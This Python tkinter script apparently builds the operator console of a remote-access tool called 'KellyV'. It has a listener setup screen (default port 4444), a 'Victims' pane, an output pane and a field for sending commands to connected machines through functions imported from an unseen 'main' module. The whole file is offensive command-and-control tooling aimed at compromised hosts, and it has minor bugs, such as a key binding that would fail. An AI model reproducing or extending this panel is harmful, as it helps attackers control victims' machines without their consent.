from tkinter import *
from main import *
import threading
import queue

# initialization
root = Tk()
root.title("KellyV Control Panel")
root.geometry("500x400")
root.resizable(False, False)
q = queue.Queue()

# tkinter stuff
class KellyV:
    def __init__(self, master):

        def sequence(*functions):
            def func(*args, **kwargs):
                return_value = None
                for function in functions:
                    return_value = function(*args, **kwargs)
                return return_value

            return func


        def createListener():
            for widget in root.winfo_children():
                widget.destroy()
            root.title("Listener Configuration")
            root.geometry("370x150")
            def validate(P):

                if P == '':
                    return True

                else:
                    if P.isdigit():
                        if int(P) < 65536:
                            return True
                        else:
                            return False


                    else:
                        return False



            vcmd = (root.register(validate), '%P')

            t_listen = lambda: threading.Thread(target=listen, args=(str(ip_thing.get()), int(port_thing.get()), int(limit_thing.get()), q)).start()

            #first
            ip_text = Label(master, text="IP:")
            ip_text.pack()
            ip_text.place(x=30, y=10)
            ip_thing = Entry(master)
            ip_thing.pack()
            ip_thing.place(x=30, y=30)
            ip_thing.insert(END, 'localhost')

            # second
            port_text = Label(master, text="Port:")
            port_text.pack()
            port_text.place(x=200, y=10)

            port_thing = Entry(master, validate="key", validatecommand=vcmd)
            port_thing.pack()
            port_thing.place(x=200, y=30)
            port_thing.insert(END, '4444')

            # limit
            limit_text = Label(master, text="Limit:")
            limit_text.pack()
            limit_text.place(x=27, y=55)

            limit_thing = Entry(master, width=5)
            limit_thing.pack()
            limit_thing.place(x=30, y=75)
            limit_thing.insert(END, '1')

            # button
            button_thing = Button(master, text="Create Listener", command=sequence(t_listen, defaultMenu))
            button_thing.pack()
            button_thing.place(x=200, y=75)

        def defaultMenu():

            t_sendcommand = lambda: threading.Thread(target=sendCommand, args=(commandInput.get(), q)).start()

            for widget in root.winfo_children():
                widget.destroy()
            root.title("KellyV Control Panel")
            root.geometry("500x400")
            mainFrame = Frame(master)
            mainFrame.pack()
            # COMMAND HEADING
            heading1 = Label(master, text="Command:")
            heading1.pack()
            heading1.place(x=30, y=350)

            # VICTIM HEADING
            heading2 = Label(master, text="Victims")
            heading2.pack()
            heading2.place(x=350, y=15)

            # OUTPUT HEADING
            heading3 = Label(master, text="Output")
            heading3.pack()
            heading3.place(x=30 ,y=15)

            # OUTPUT TEXT
            outputText = Text(master, width=17, height=17)
            outputText.pack()
            outputText.place(x=37, y=30)

            # COMMAND ENTRY
            global commandInput
            commandInput = Entry(master, width=60)
            root.bind('<Return>', t_sendcommand)
            commandInput.pack()
            commandInput.place(x=30, y=375)

            # EXECUTE BUTTON
            executeButton = Button(master, text="Send", command=t_sendcommand)
            executeButton.pack()
            executeButton.place(x=420, y=371)


            # EXECUTE BUTTON
            listenButton = Button(master, text="Create Listener", command=lambda: createListener())
            listenButton.pack()
            listenButton.place(x=400, y=340)
        defaultMenu()
e = KellyV(root)
root.mainloop()